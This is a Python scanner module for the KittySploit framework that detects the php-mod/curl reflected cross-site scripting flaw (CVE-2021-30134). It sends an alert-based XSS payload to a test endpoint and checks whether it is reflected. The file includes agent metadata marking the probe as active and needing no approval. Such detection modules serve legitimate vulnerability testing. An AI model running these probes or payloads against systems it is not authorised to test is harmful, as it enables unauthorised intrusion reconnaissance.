#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Php-mod/curl library before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Php-mod/curl Library <2.3.2 - Cross-Site Scripting Detection',
        'description': 'Php-mod/curl library before 2.3.2 contains a cross-site scripting vulnerability via the post_file_path_upload.php key parameter and the POST data to post_multidimensional.php. An attacker can inject arbitrary script, which can allow theft of cookie-based authentication credentials and launch of other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'php-mod', 'wpscan', 'php_curl_class_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/0b547728-27d2-402e-ae17-90d539344ec7',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-30134',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-30134',
    }

    def run(self):
        r = self.http_request(method="GET", path='/vendor/curl/curl/tests/server/php-curl-test/post_file_path_upload.php?key=<img%20src%20onerror%3dalert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        server = r.headers.get("Server") or r.headers.get("server") or ""
        body_any = ('key":"<img src onerror=alert(document.domain)>"',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Php-mod/curl Library <2.3.2 - Cross-Site Scripting detected",
                path='/vendor/curl/curl/tests/server/php-curl-test/post_file_path_upload.php?key=<img%20src%20onerror%3dalert(document.domain)>',
            )
            return True
        return False

